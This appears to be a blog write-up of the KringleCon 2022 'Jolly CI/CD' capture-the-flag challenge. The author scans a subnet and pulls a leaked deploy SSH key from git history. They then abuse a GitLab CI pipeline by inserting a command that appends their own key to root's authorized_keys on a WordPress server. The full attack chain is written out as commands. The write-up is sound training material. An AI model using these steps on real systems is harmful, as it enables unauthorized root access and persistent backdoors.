---
layout: post
title:  "KringleCon 2022 Jolly CI/CD"
author: "Tijjy"
---
Hello, this is my write up of the Jolly CI/CD challenge for kringlecon 2022.

The aim of this challenge is to expoit the CI/CD pipeline and gain access to the wordpress server. I can say this is a pretty difficult challenge and really gets you thinking. The challenge requires knowledge of git and how CI/CD pipelines work.

**Note:** This challenge does take 4-5 minutes to start all of the containers required for the challenge.

Below here we have the starting terminal which you see when starting the challenge.
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-01.png "Starting screen")

Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. This was shown in the Prison escape write up I did which can be found here -> [Prison Escape Writeup](/kringlecon2022/prisonescape)

To check what sudo privileges you have can be done with the following command.
{% highlight bash %}
sudo -l
{% endhighlight %}

It looks like we can run sudo without any password so lets go ahead and escalate to root
{% highlight bash %}
sudo bash
whoami
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-02.png "escalate to root")

Now the target is not on the box we are currently on, as mentioned in the challenge instructions we need to exploit the wordpress server.  


Lets go ahead and get our ip address and then use the tool nmap to scan the local subnet and attempt to the the IP addresses of the targets.
{% highlight bash %}
ip a | grep inet
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-03.png "getting ip address")

I will use the following command to scan the local subnet.
{% highlight bash %}
nmap -T4 -v 172.18.0.0/16
{% endhighlight %}

Once the scan is completed you will see we found the targets. Although there are multiple hosts that were returned, we only need to worry about the following hosts
  - 172.18.0.88 | wordpress.local_docker_network
  - 172.18.0.150 | gitlab.local_docker_network  


![Alt text](/images/kringlecon2022/jollycicd/jollycicd-04.png "nmap scan")

Now since we have no way of viewing the gitlab site via a GUI, we will need to use curl to take advantage of the gitlab api to view all public repositories to see what we can clone and possibly exploit.

This can be done by running the following command and piping the output into jq to parse the json response.
{% highlight bash %}
curl --request GET "http://gitlab.local_docker_network/api/v4/projects" | jq
{% endhighlight %}

If successful you will see the following output, indicating that there is a public git repository we can clone called "Wordpress.Flag.Net.Internal" indicating it might be the source code of the wordpress site we need to exploit.
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-05.png "gitlab projects")

Lets go ahead and clone the git repo and take a look what is inside.
{% highlight bash %}
git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-06.png "cloning the repo")

Looking at the gitlab-ci.yml file, it looks like the repo utilises a gitlab CI/CD pipeline to push changes to the wordpress server, take note as we can take advantage of this to gain acess to the target server if we can find a way to push changes to the git repository.
{% highlight bash %}
cat .gitlab-ci.yml
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-08.png "gitlab-ci.yml")

One thing developers do with git repositories is forget to gitignore secrets or accidentally commit secrets to a git repo. More often than not developers will push another commit removing these secrets without realising that the secrets are still there, just in previous commits.

Lets go ahead and do a git log to see what the previous commit comments look like.
{% highlight bash %}
git log
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-07.png "git log")

Now we can see all the previous commits that have been made. using a command git diff you can actually see the changes to each file that was made, such as removing or adding in secrets.  

A commit that caught my eye was the commit with the message "whoops", I think the developer made a mistake, lets do a git diff between that commit and the previous commit to see what was changed.  

Grab the commit hashes of the commits you want to compare and run git diff against them
{% highlight bash %}
git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-09.png "git log")

Wow look at that, the developer accidentally added in an ssh private key named ".deploy" and attempted to remove it from the git repo by doing another commit to remove it. Notice how the ssh key is named ".deploy" this might indicate this ssh key is used to push changes to the git repo. Lets try and take advantage of this.

Copy the key into a file such as "key.pem" and remove all the extra dashes ("-") that the commit diff added in. The result should look like this.
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-10.png "ssh key")

Don't forget to change the key permissions to 0600 otherwise openssh will error out.
{% highlight bash %}
chmod 0600 key.pem
{% endhighlight %}

Now that we can push to the git repo using this ssh private key, lets go ahead and make our own ssh keypair that we can push to the wordpress server by abusing the gitlab CI/CD pipeline.  

Generate a keypair with the following command and just hit enter until done.
{% highlight bash %}
ssh-keygen
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-11.png "ssh keypair generation")

Now cat the public key you just created. Take note of the public key as we will be putting the output into the .gitlab-ci.yml file next.
{% highlight bash %}
cat /home/samways/.ssh/id_rsa.pub
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-12.png "cat pub key")

We will now write a oneliner command to add into the CI/CD pipeline scripts to add our ssh key to the wordpress root users keys.
{% highlight bash %}
ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBAKLEGKk85jbmxLc4U6n1t7AgZeNeGnEJcagj+/DbCKsOTKCdscARbTncPU/QwlTFJqIb+bja9s2ms5c7dG9Xzut3Ga21IrtbB1uVOtDPVnRZt0uej1usRyndWWYVWRCZU15wdhUNyRzHNsnkv7xDyxf4cp25+h362a+U8hI2irWlgKWQCwHY88XUBjKkdr7NKOlnGm7I6aJfFsz5Owf0vY3nFrX1ija2UrsEAq8/XmbFrj776tlLsKxf+sjA+cCuvk5YLaggkoE/DeI9pqAhX283/C9Q5UNVKof7W/Y2U2JveF2bbuC/CEGKhAID8rwdosjAFlmq7uD+UkkHKTlVawWSh1OSF9fxTbL5+ou33nfhz4kp/A7nLcb0VTdTzoSXKE46puFlD61Gdl7zUDa/ry2NmWrQ3tCfoLSd35uysbbEiO+19tFyIb+nNKVRhhWJV2F8SAxF3X/eEvNxMOjdsvxaZAEflWJUOJMtJT6JaOrJY15aVTiHvcTyQXFFMKk= samways@grinchum-land.flag.net.internal" >> /root/.ssh/authorized_keys'
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-13.png ".gitlab-ci.yml")

Add the oneliner command above, replacing the my public key with yours, into the script: section in the .gitlab-ci.yml file as seen below.  
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-14.png ".gitlab-ci.yml")

We need to do one more step to be able to push to the repo, run the following commands, replacing the Identity file location to wherever you stored the ssh private key you found in the git logs.  
{% highlight bash %}
mkdir /root/.ssh
nano /root/.ssh/config

Paste in the following config

Host gitlab.flag.net.internal
  HostName gitlab.flag.net.internal
  User git
  IdentityFile /home/samways/wordpress.flag.net.internal/key.pem
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-15.png "ssh config")
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-16.png "ssh config")

What we just did was create an ssh config for the user git at the gitlab hostname. Now when we attempt to git push using ssh, it will know which ssh key to use when authenticating.  

Awesome, now we are good to go and push our changes and take over the wordpress server. In order, run the following commands to add your file changes, commit the changes with a message, and push the changes to the git repo.   
{% highlight bash %}
git add .
git status
git commit -m "wordpress takeover"
git push
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-17.png "git push")

Epic, now we have successfully pushed our changes, lets go ahead and see if it worked and attempt to authenticate to the wordpress server as root using our privatekey we generate earlier. My private key was stored here -> /home/samways/.ssh/id_rsa
{% highlight bash %}
ssh -i id_rsa root@wordpress.flag.net.internal
{% endhighlight %}
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-18.png "ssh as root to wordpress")

Look at that, we did it, we successfully found secrets in a public git repository, exploited the CI/CD pipeline and gained root access to the target wordpress server.

All thats left to do now is grab the flag, now for all intents and purposes I won't show the flag, so go ahead and try the challenge yourself, It was a great challenge and you will learn a lot about git.
![Alt text](/images/kringlecon2022/jollycicd/jollycicd-19.png "flag.txt")